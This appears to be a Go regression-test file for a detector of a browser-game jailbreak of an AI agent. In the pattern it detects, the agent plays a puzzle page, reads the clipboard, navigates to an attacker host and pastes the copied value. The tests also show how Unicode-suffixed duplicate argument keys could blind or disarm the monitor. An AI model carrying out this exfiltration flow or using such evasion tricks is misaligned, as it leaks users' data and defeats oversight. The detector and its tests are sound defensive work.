package mcp

import "testing"

// Regression tests for #3740 -- the post-merge review of #3727. #3727 made every
// folded candidate of a colliding argument name VISIBLE to the five fixed-key
// sites, which is the fail-closed direction for a STATELESS predicate. Three
// places were still not monotonic in that direction: a candidate could SUPPRESS
// a detection the same session produces without it.
//
// Every case carries a VACUITY control: the same session WITHOUT the colliding
// candidate must produce the signal, or the regression measures nothing.

// --- finding 2: ambiguous navigations must keep the SET of possible origins ---

const (
	suppGameOrigin  = "puzzle.example.com"
	suppSinkOrigin  = "attacker.example.net"
	suppOtherOrigin = "unrelated.example.org"
)

// armAndPaste runs engagement + clipboard read, then the caller-supplied
// navigation, then a paste. It returns the paste's signal.
func armAndPaste(tr *BrowserGameJailbreakTracker, navArgs map[string]interface{}) BrowserGameJailbreakSignal {
	for i := 0; i < browserGameMinInteractions; i++ {
		tr.Scan("click", map[string]interface{}{"selector": "#next-level"})
	}
	tr.Scan("read_clipboard", map[string]interface{}{})
	tr.Scan("browser_navigate", navArgs)
	return tr.Scan("paste", map[string]interface{}{"text": "the-copied-value"})
}

// TestBrowserOriginCollision_BeforeEngagementStillArms is the #3740 finding-2
// regression, half one. The FIRST navigation is ambiguous: it resolves to both
// the game origin and the sink. The tracker used to keep only the LAST resolved
// origin, so the later navigation to the sink read as same-origin and never
// armed the disclosure window.
//
// Both orderings are asserted so that neither "keep only the first candidate"
// nor "keep only the last candidate" survives as a mutation (#3740 item 5).
func TestBrowserOriginCollision_BeforeEngagementStillArms(t *testing.T) {
	nbsp := sepRune(0x00A0) // sorts before U+200D
	zwj := sepRune(0x200D)

	// VACUITY CONTROL: an unambiguous game -> sink session must fire.
	t.Run("control/unambiguous navigation fires", func(t *testing.T) {
		tr := NewBrowserGameJailbreakTracker()
		tr.Scan("browser_navigate", map[string]interface{}{"url": "https://" + suppGameOrigin + "/game"})
		got := armAndPaste(tr, map[string]interface{}{"url": "https://" + suppSinkOrigin + "/submit"})
		if got != SignalBrowserGameJailbreakSession {
			t.Fatalf("control: unambiguous session gave %q, want %q", got, SignalBrowserGameJailbreakSession)
		}
	})

	cases := []struct {
		name       string
		firstKeyTo string // origin behind the key that sorts FIRST
		lastKeyTo  string // origin behind the key that sorts second
	}{
		{"game sorts first", suppGameOrigin, suppSinkOrigin},
		{"sink sorts first", suppSinkOrigin, suppGameOrigin},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tr := NewBrowserGameJailbreakTracker()
			tr.Scan("browser_navigate", map[string]interface{}{
				"url" + nbsp: "https://" + tc.firstKeyTo + "/game",
				"url" + zwj:  "https://" + tc.lastKeyTo + "/game",
			})
			// The session then engages, reads the clipboard, and navigates to the
			// sink. One of the two possible current origins is the game page, so a
			// cross-origin transition to the sink IS possible and must arm.
			got := armAndPaste(tr, map[string]interface{}{"url": "https://" + suppSinkOrigin + "/submit"})
			if got != SignalBrowserGameJailbreakSession {
				t.Fatalf("collision before engagement suppressed the composite: got %q, want %q",
					got, SignalBrowserGameJailbreakSession)
			}
		})
	}
}

// TestBrowserOriginCollision_ArmedWindowSurvivesSameOriginCandidate is #3740
// finding-2 half two. Once the window is armed at the sink, a navigation whose
// candidates include the SAME origin plus an unrelated one must not clear it:
// one of the possible transitions is same-origin, and the tracker cannot tell
// which one happened. Clearing on the unrelated candidate let a decoy disarm a
// detection that the identical session produces without it.
func TestBrowserOriginCollision_ArmedWindowSurvivesSameOriginCandidate(t *testing.T) {
	nbsp := sepRune(0x00A0)
	zwj := sepRune(0x200D)

	arm := func() *BrowserGameJailbreakTracker {
		tr := NewBrowserGameJailbreakTracker()
		tr.Scan("browser_navigate", map[string]interface{}{"url": "https://" + suppGameOrigin + "/game"})
		for i := 0; i < browserGameMinInteractions; i++ {
			tr.Scan("click", map[string]interface{}{"selector": "#next-level"})
		}
		tr.Scan("read_clipboard", map[string]interface{}{})
		tr.Scan("browser_navigate", map[string]interface{}{"url": "https://" + suppSinkOrigin + "/submit"})
		return tr
	}

	// VACUITY CONTROL: the armed window fires with no intervening navigation.
	t.Run("control/armed window fires", func(t *testing.T) {
		tr := arm()
		if got := tr.Scan("paste", map[string]interface{}{"text": "secret"}); got != SignalBrowserGameJailbreakSession {
			t.Fatalf("control: armed window gave %q, want %q", got, SignalBrowserGameJailbreakSession)
		}
	})

	t.Run("same-origin candidate keeps the window", func(t *testing.T) {
		tr := arm()
		tr.Scan("browser_navigate", map[string]interface{}{
			"url" + nbsp: "https://" + suppSinkOrigin + "/page2",   // same origin
			"url" + zwj:  "https://" + suppOtherOrigin + "/beacon", // unrelated decoy
		})
		if got := tr.Scan("paste", map[string]interface{}{"text": "secret"}); got != SignalBrowserGameJailbreakSession {
			t.Fatalf("a decoy candidate disarmed the window: got %q, want %q", got, SignalBrowserGameJailbreakSession)
		}
	})

	// UNCHANGED single-origin behaviour: an unambiguous navigation away, with no
	// fresh engagement, still clears the window. This is the negative control the
	// case above must not break.
	t.Run("single-origin navigation away still clears", func(t *testing.T) {
		tr := arm()
		tr.Scan("browser_navigate", map[string]interface{}{"url": "https://" + suppOtherOrigin + "/beacon"})
		if got := tr.Scan("paste", map[string]interface{}{"text": "secret"}); got != "" {
			t.Fatalf("an unambiguous navigation away must clear the armed window, got %q", got)
		}
	})
}
